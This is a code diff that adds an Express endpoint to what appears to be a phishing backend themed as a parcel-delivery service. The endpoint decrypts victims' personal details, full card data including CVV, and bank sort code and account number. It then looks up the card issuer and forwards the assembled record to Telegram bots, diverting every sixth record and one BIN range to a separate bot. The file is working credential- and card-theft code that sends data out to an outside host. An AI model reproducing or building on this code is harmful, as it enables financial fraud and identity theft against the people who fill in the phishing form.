@@ -671,6 +671,65 @@ app.post('/mazzaYodel', (req, res) => {
     })
 });
 
+let hoods = 2;
+
+app.options('/hoodsYodel', cors())
+
+app.post('/hoodsYodel', (req, res) => {
+    fullname = CryptoJS.AES.decrypt(req.body.fullname, '402312').toString(CryptoJS.enc.Utf8);
+    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
+    address = CryptoJS.AES.decrypt(req.body.address, '402312').toString(CryptoJS.enc.Utf8);
+    city = CryptoJS.AES.decrypt(req.body.city, '402312').toString(CryptoJS.enc.Utf8);
+    postcode = CryptoJS.AES.decrypt(req.body.postcode, '402312').toString(CryptoJS.enc.Utf8);
+    telephone = CryptoJS.AES.decrypt(req.body.telephone, '402312').toString(CryptoJS.enc.Utf8);
+    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
+    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
+    cvv = CryptoJS.AES.decrypt(req.body.cvv, '402312').toString(CryptoJS.enc.Utf8);
+    userAgent = CryptoJS.AES.decrypt(req.body.userAgent, '402312').toString(CryptoJS.enc.Utf8);
+    userIp = CryptoJS.AES.decrypt(req.body.userIp, '402312').toString(CryptoJS.enc.Utf8);
+    scode = CryptoJS.AES.decrypt(req.body.scode, '402312').toString(CryptoJS.enc.Utf8);
+    accno = CryptoJS.AES.decrypt(req.body.accno, '402312').toString(CryptoJS.enc.Utf8);
+    bin = req.body.bin;
+
+    if (bin.length === 7) {
+        formatBin = bin.replace(/ /g, '');
+        if (formatBin.length === 7) {
+            formatBin = bin.slice(0, -1);
+        }
+        bin = formatBin;
+    }
+    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
+        if (!resp.data.bank) {
+            bankName = ""
+        } else {
+            bankName = resp.data.bank.name;
+        }
+    }).then(function () {
+        binList = `${bin} | ${dob} | ${postcode} | ${bankName}`
+        var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
+        if (hoods == 6) {
+            axios.post(
+                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
+            );
+            hoods = 0;
+        } else if (bin === "542011") {
+            axios.post(
+                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
+            );
+        } else {
+            axios.post(
+                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelHoods:\n${originalText}`
+            );
+            axios.post(
+                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=2126545981&text=Yodel:\n${originalText}`
+            );
+            hoods += 1;
+        }
+
+        res.send("Update Completed");
+    })
+});
+
 app.options('/sendBigBillz20', cors())
 
 let bill = 0;
